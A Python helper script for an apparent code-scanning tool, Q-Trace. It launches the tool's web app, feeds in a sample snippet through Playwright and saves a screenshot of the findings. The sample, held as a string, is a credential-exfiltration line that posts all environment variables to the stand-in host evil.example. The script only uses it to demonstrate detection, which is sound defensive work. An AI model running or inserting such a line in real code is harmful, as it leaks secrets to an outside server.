#!/usr/bin/env python3
"""
capture_ui.py — screenshot the Q-Trace web UI with Playwright (Chromium).

Runs locally or in CI:
    pip install playwright && python -m playwright install chromium
    python tools/capture_ui.py        # from the qtrace-pro/ directory

It boots webapp.py on a free port, loads the page, runs the "credential exfil"
example so the screenshot shows real findings, and writes assets/qtrace-ui.png
at the repository root.
"""
from __future__ import annotations

import os
import socket
import subprocess
import sys
import time
from contextlib import closing

HERE = os.path.dirname(os.path.abspath(__file__))
QDIR = os.path.dirname(HERE)                       # qtrace-pro/
ROOT = os.path.dirname(QDIR)                        # repo root
OUT = os.path.join(ROOT, "assets", "qtrace-ui.png")

EXAMPLE = ("import os, requests\n"
           "requests.post('https://evil.example/c2', data=os.environ)")


def _free_port() -> int:
    with closing(socket.socket()) as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def _wait_for_port(port: int, timeout: float = 20.0) -> bool:
    end = time.time() + timeout
    while time.time() < end:
        with closing(socket.socket()) as s:
            if s.connect_ex(("127.0.0.1", port)) == 0:
                return True
        time.sleep(0.2)
    return False


def main() -> int:
    from playwright.sync_api import sync_playwright

    port = _free_port()
    server = subprocess.Popen([sys.executable, "webapp.py", "--port", str(port)], cwd=QDIR)
    try:
        if not _wait_for_port(port):
            print("error: webapp.py did not start", file=sys.stderr)
            return 1
        os.makedirs(os.path.dirname(OUT), exist_ok=True)
        with sync_playwright() as p:
            browser = p.chromium.launch()
            page = browser.new_page(viewport={"width": 1200, "height": 820},
                                    device_scale_factor=2)
            page.goto(f"http://127.0.0.1:{port}/", wait_until="networkidle")
            page.fill("#code", EXAMPLE)
            page.click("#run")
            page.wait_for_selector(".finding", timeout=10000)
            page.wait_for_timeout(400)  # let cards settle
            page.screenshot(path=OUT, full_page=True)
            browser.close()
        print(f"wrote {OUT}")
        return 0
    finally:
        server.terminate()
        try:
            server.wait(timeout=5)
        except Exception:
            server.kill()


if __name__ == "__main__":
    raise SystemExit(main())
